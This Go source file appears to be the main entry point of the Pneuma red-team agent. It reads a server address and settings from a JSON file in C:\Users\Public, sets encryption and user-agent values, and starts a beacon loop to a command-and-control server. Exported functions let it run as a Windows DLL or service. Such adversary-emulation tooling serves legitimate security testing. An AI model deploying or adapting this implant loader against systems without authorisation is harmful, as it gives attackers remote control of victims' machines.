//+build cgo

package main

import "C"
import (
	"encoding/json"
	"fmt"
	"github.com/preludeorg/pneuma/sockets"
	"github.com/preludeorg/pneuma/util"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

var randomHash = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"

type ConfigFile struct {
	Address string `json:"Address"`
	Contact string `json:"Contact"`
	Range string `json:"Range"`
	Debug bool `json:"Debug"`
}

func main() {
	agent := util.BuildAgentConfig()
	data, _ := ioutil.ReadFile("C:\\Users\\Public\\agent.json")
	var config ConfigFile
	err := json.Unmarshal(data, &config)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	agent.SetAgentConfig(map[string]interface{}{
		"Address": config.Address,
		"Contact": config.Contact,
		"Range": config.Range,
	})
	util.DebugMode = &config.Debug
	if !strings.Contains(agent.Address, ":") {
		log.Println("Your address is incorrect")
	}
	util.EncryptionKey = &agent.AESKey
	sockets.UA = &agent.Useragent
	util.DebugLogf("[%s] agent at PID %d using hash randomizing string %s", agent.Address, agent.Pid, randomHash)
	sockets.EventLoop(agent, agent.BuildBeacon())
}


//export ServiceCrtMain
func ServiceCrtMain() {
	agent := util.BuildAgentConfig()
	data, _ := ioutil.ReadFile("C:\\Users\\Public\\agent.json")
	var config ConfigFile
	err := json.Unmarshal(data, &config)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	agent.SetAgentConfig(map[string]interface{}{
		"Address": config.Address,
		"Contact": config.Contact,
		"Range": config.Range,
	})
	util.DebugMode = &config.Debug
	if !strings.Contains(agent.Address, ":") {
		log.Println("Your address is incorrect")
	}
	util.EncryptionKey = &agent.AESKey
	sockets.UA = &agent.Useragent
	util.DebugLogf("[%s] agent at PID %d using hash randomizing string %s", agent.Address, agent.Pid, randomHash)
	sockets.EventLoop(agent, agent.BuildBeacon())
}


//export ServiceMain
func ServiceMain() {
	fmt.Println("Running")
}